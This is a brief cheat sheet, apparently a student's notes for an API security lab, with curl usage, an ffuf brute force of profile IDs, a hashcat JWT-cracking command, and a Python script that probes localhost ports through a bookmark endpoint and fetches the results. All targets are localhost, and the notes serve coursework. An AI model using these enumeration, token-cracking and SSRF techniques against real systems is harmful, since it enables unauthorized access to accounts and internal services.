# Curl
```bash
-i - Include headers
-X - HTTP Request type
-H - Header value
-d - Data

# GET
curl -H "GATECH_ID: 904160213" -iX <GET> <Target>/<API>

# POST
curl -H "GATECH_ID: 904160213" -iX <POST> <Target>/<API> -H "Content-Type: application/json" -d "{\"<Field>\":\"<Value>\"}"
curl -H "GATECH_ID: 904160213" -iX <POST> <Target>/<API> --json '{"<Key>":"<Value>"}'

# Brute force user IDs
seq -w 10000000 99999999 | ffuf -u http://localhost:8080/profiles/FUZZ -X GET -H "GATECH_ID: 904160213" -w -

# Crack JWT
hashcat -a 0 -m 16500 <Token> <Wordlist>
```

# JWT
https://workbook.securityboat.net/Pentesting/Web%20Application/jwt-and-its-bypass/  

# Brute Force API IDs
```python
#!/usr/bin/env python3

import requests
import json
import re

for i in range(0,9000):

    r = requests.post('http://localhost:8080/bookmarks', json={'url': f'http://localhost:{i}'}, headers={'GATECH_ID': '904160213'})
    id = re.search(r"[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}", r.content.decode())

    search_id = id.group(0)

    r2 = requests.get(f'http://localhost:8080/bookmarks/{search_id}', headers={'GATECH_ID': '904160213'})

    print(r2.content)
```

# API Paths
```
https://gist.github.com/rodnt/250dd33af97d228cc94cd11504abef06
```
